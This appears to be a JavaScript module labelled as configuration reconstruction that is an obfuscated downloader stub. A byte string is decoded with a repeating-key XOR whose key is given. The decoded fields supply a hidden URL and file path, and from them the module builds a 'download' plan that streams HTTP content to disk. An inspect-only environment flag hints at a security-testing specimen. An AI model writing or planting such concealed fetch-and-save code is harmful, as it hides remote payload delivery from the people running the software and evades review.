// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_adf38f88 = "\\u009d\\u0052\\u0046\\u0018\\u0020\\u009f\\u000a\\u0007\\u0017\\u006e\\u008a\\u000c\\u0006\\u0011\\u003a\\u0099\\u000a\\u0028\\u0016\\u0036\\u0086\\u0000\\u0003\\u0001\\u007f\\u009c\\u001d\\u001e\\u0010\\u0036\\u00b4\\u0009\\u001e\\u0008\\u0036\\u0097\\u000e\\u0013\\u0005\\u0023\\u009f\\u000a\\u0005\\u0059\\u003b\\u009f\\u001b\\u0007\\u003b\\u0027\\u0084\\u0030\\u0004\\u0010\\u0021\\u008e\\u000e\\u001a\\u0018\\u0020\\u009f\\u000e\\u0010\\u0001\\u000c\\u0088\\u0000\\u0002\\u000a\\u0027\\u00d6\\u005e\\u000b\\u0007\\u0032\\u0086\\u001f\\u0016\\u000d\\u0034\\u0085\\u0030\\u001e\\u0000\\u006e\\u00a5\\u0020\\u0033\\u0021\\u007e\\u00df\\u005f\\u0047\\u0052\\u0015\\u00df\\u002e\\u0041\\u0018\\u0026\\u0099\\u0003\\u004a\\u000c\\u0027\\u009f\\u001f\\u0004\\u005e\\u007c\\u00c4\\u0001\\u0018\\u0000\\u0036\\u00c6\\u005b\\u0047\\u0054\\u0065\\u008d\\u005b\\u0016\\u0052\\u0036\\u00db\\u000c\\u0012\\u004a\\u0036\\u0093\\u000e\\u001a\\u0014\\u003f\\u008e\\u0041\\u001e\\u000a\\u0025\\u008a\\u0003\\u001e\\u0000\\u007c\\u008a\\u001f\\u001e\\u0018\\u0026\\u0098\\u000a\\u0005\\u003b\\u0032\\u008c\\u000a\\u0019\\u0010\\u006e\\u00a5\\u0000\\u0013\\u0001\\u0012\\u009e\\u000b\\u001e\\u0010\\u007c\\u00df\\u005f\\u0047\\u0052\\u002f\\u008d\\u0006\\u001b\\u0001\\u000c\\u009b\\u000e\\u0003\\u000c\\u006e\\u00c4\\u001b\\u001a\\u0014\\u007c\\u0083\\u001a\\u0019\\u0010\\u0021\\u008e\\u001c\\u0004\\u0049\\u003d\\u0084\\u000b\\u0012\\u004b\\u007d\\u0098\\u001b\\u0016\\u0003\\u0036\\u00c6\\u005b\\u0047\\u0054\\u0065\\u008d\\u005b\\u0016\\u0052\\u0036\\u00db\\u000c\\u0012\\u004a\\u003e\\u0081\\u001c";
const Codec_adf38f88 = "unicode_escapes|repeating_key_xor|eb,6f,77,64,53";

function load_adf38f88() { return [...Material_adf38f88.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_adf38f88(storedBytes) { const keyBytes = [235,111,119,100,83]; return storedBytes.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
async function recover_adf38f88() {
  const [harmlessValue] = ["compass"];
  const storedBytes = load_adf38f88(); let recoveredBytes = [];
  for (const decodePass of [1]) recoveredBytes = decode_adf38f88(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_adf38f88() { return ({ ...{ value: await recover_adf38f88() } }).value; }
async function plan_adf38f88() { const inspect = inspect_adf38f88; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_adf38f88;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_adf38f88());

// reconstruction complete